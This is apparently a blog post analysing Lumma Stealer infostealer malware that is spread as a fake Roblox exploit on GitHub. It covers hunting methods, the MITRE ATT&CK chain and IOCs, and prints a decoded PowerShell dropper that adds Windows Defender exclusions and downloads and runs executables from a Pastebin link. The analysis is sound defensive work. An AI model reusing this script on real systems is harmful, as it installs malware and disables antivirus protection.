## Introduction

![](https://miro.medium.com/v2/resize:fit:468/1*gTVaPjykGnyo4wzPFbRKyg.png)

*Disclaimer: This content is intended for educational and research purposes only. Do not download or interact with malware without appropriate safeguards and precautions.*

To bridge the technical gap on malware for non-technical audiences, this is the first in a series I like to call 'Malware in the Wild.' I will provide additional context that may be lost on those without a technical background in computers. Malware comes in various forms, and the objectives of the threat group can also vary. Oftentimes, it is not to destroy the victim’s computer.

## Brief Overview

[Lumma Stealer](https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/) (Lumma) is an infostealer malware that has gained popularity among financially motivated threat actors. This malware targets saved browser credentials (such as autofill), cryptocurrency wallets, and harvests documents on a victim’s computer. Lumma’s model is an affiliate program (also known as Malware-as-a-Service), where malware developers sell the code and even the infrastructure to threat actors, also known as affiliates. Essentially, our threat actors outsource the technical part of stealing from victims. Hell, there is even [customer support](https://www.esentire.com/blog/the-case-of-lummac2-v4-0) for this program.

![](https://miro.medium.com/v2/resize:fit:468/1*78nfrQDOwL2cDbqacEPbkg.png)

Lumma experienced a recent [setback](https://blogs.microsoft.com/on-the-issues/2025/05/21/microsoft-leads-global-action-against-favored-cybercrime-tool/) due to Operation Endgame, which impacted Lumma’s infrastructure by seizing 2,300 domains. The FBI even contacted the affiliates with this message:

![](https://miro.medium.com/v2/resize:fit:436/1*cg0EYGNhFlruSK9e4fmN5A.png)

But despite this seizure and uncovering of affiliates, Lumma [persists](https://theravenfile.com/2025/05/23/lumma-stealer-still-active-after-fbi-crackdown/).

## Hunting for Lumma

So, how do we find Lumma in the wild? I came across a [video](https://youtu.be/CoUUJqhKElQ?si=iqbdivye9mdpzv4p&t=1062) where the researcher analyzes the Lumma he saw on a GitHub page for a Roblox hack. I used Solara as the keyword for my search. It made perfect sense why. Say you (the reader) are super savvy about the tricks pulled by threat actors to gain access to your computer. What about your kids? The desire to win or bypass a video game will trump any hypothetical security talks you would have with them.

Think of finding Malware in the wild as hunting. We can do some Google Dorking to cast a net. Google Dorking is a more refined search tool in Google. It looks something like this: site:github.io solara. Through some searching, I refine my rule, and I find hxxxs://github[.]com/russtha1n/SolaraExecutor.

![](https://miro.medium.com/v2/resize:fit:700/1*BPIQGLqcuvQBVi7FHa9cHw.png)

We will focus on this page, but I want to establish a rule for hunting since the GitHub page will be taken down eventually, and I want to monitor this activity in the future. Our threat actor likes to tag their GitHub page with a bunch of topics:

```
roblox-script-execution-free-new  
roblox-hack-download-free-2025  
roblox-lua-executors-fresh  
roblox-hack-best-2025-free  
roblox-executor-for-pc-github  
roblox-executor-pc-github-2025  
roblox-executor-fresh-one  
roblox-hack-download-github-2025  
solara-executor-free-latest-2025  
roblox-executers-2025-github-new  
roblox-executer-latest-update-2025
```
I found [roblox-script-execution-free-new](https://github.com/topics/roblox-script-execution-free-new?o=desc&s=updated) to have the most results with 73 pages. Another thing to note about these pages is ChatGPT wrote them. The structure and phrasing read very AI-like.

![](https://miro.medium.com/v2/resize:fit:700/1*WtI4uimHBvscbZKgox1aAg.png)

I have also found that these GitHub pages instruct the victim to create exclusion rules for antivirus software to ensure it works. That is the kiss of death for any software. That lets the malware roam free.

## Malware Analysis

But now that we know one of the ways our affiliate can gain initial access to a victim’s computer…what does it do?

Malware analysis is very challenging to translate into a broad audience. It requires knowledge about systems, networks, and programming. I will review the broad strokes of what is happening when Lumma is running and utilize the MITRE ATT&CK framework for the attack chain.

I will be using a sandbox environment from [Any Run](https://any.run/), as it streamlines the analysis and, most importantly, it is free.

For reference, here is a visual of the attack chain:
![](https://miro.medium.com/v2/resize:fit:700/1*XU5Zw5LKLmaCtAWO9N9ORQ.png)

## PowerShell for Command Execution (T1059.001)

I downloaded Solara V3.exe, and when I executed the program, it ran a PowerShell script, but it did so discreetly. Threat actors often obfuscate their scripts by encoding them in Base64. Here is what it looks like:

![](https://miro.medium.com/v2/resize:fit:700/1*Mc8PyFrXN1jsSHozX0XmnA.png)

Yeah, we aren’t going to be able to read that…but our computers can. A popular tool to decode this string is [CyberChef](https://cyberchef.io/). And this is our result:

```
# Start a hidden PowerShell process to display a message box
Start-Process powershell -WindowStyle Hidden -ArgumentList @"
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.MessageBox]::Show('', '', 'OK', 'Error');
"@

# Add exclusions to Windows Defender
Add-MpPreference -ExclusionPath @($env:UserProfile, $env:SystemDrive) -Force

# Download files from a Pastebin URL and execute them
$wc = New-Object System.Net.WebClient
$lnk = $wc.DownloadString('https://pastebin.com/raw/rkwztbjh').Split("`r`n")

# Generate a random file name prefix
$fn = [System.IO.Path]::GetRandomFileName()

# Download and execute each file
for ($i = 0; $i -lt $lnk.Length; $i++) {
    $filePath = Join-Path -Path $env:AppData -ChildPath ($fn + $i.ToString() + '.exe')
    $wc.DownloadFile($lnk[$i], $filePath)
    Start-Process -FilePath $filePath
}
```

Lumma starts a hidden PowerShell process so the victim doesn’t see what it is doing. It then creates an antivirus exclusion for the entire system drive and the user profile. Then, it downloads and executes another file from Pastebin. hxxxs://pastebin[.]com/raw/rkwztbjh. This site redirects to a GitHub page: hxxxs://github[.]com/comeppr1/narc1/raw/refs/heads/main/stub1.exe. The script renames the file with random characters; in our case, it is called o4ypv3f0.crd0.exe.

This file holds the Lumma malware payload.

## Software Discovery and C2 communication (T1012, T1518, T1102)

The file we downloaded starts a new process called MSBuild.exe. Which seems legitimate on the surface. However, this process searches for installed software, the computer's name, supported languages, and software policies. It also creates a communication channel through Telegram and the Command and Control (C2) server. In this case, our Lumma was talking to Telegram through IP 149.154.167[.]99. The C2 server channel is at 195.82.147[.]188 with a domain name swenku[.]xyz.

When we reference that IP on VirusTotal, we confirm our suspicion that this malware is communicating with a C2 server. If a C2 server has a persistent connection, it can execute commands and exfiltrate whatever information it is looking to steal.

![](https://miro.medium.com/v2/resize:fit:700/1*LbXqF1XB_2TmfXrEzMt3Fg.png)

## Conclusion

Lumma is a very active threat in the wild. The use of malware masquerading as Roblox hacks should be concerning to anyone with children. This is only one case that I uncovered, and I have no doubt that it affects other video games, such as Fortnite and Minecraft. This Malware is designed to be quiet with the antivirus exclusions. My recommendation to prevent this from impacting potential victims is to ensure your Windows profile is not set to be an administrator. The administrator account should only be used on a per-need basis instead of perpetually. However, since it is the default account, many people continue to use it. The PowerShell script I uncovered earlier has no traction if you are not using an administrator account.

## IOCs

```
hxxxs://github[.]com/russtha1n/SolaraExecutor  
  
Solara V3.exe  
fb45131709af13a9b64f8adf315277787a5352d4636e28cd940f502436a9f1f2  
  
stub1.exe  
4ad66310e5539efdde327df436d1f678f0ec1c1acadcde7a59a7e0401fd9a220  
  
hxxxs://github[.]com/comeppr1/narc1/raw/refs/heads/main/stub1.exe  
  
hxxxs://pastebin[.]com/raw/rkwztbjh  
  
swenku[.]xyz  
140.82.121[.]4  
104.22.69[.]199  
195.82.147[.]188
```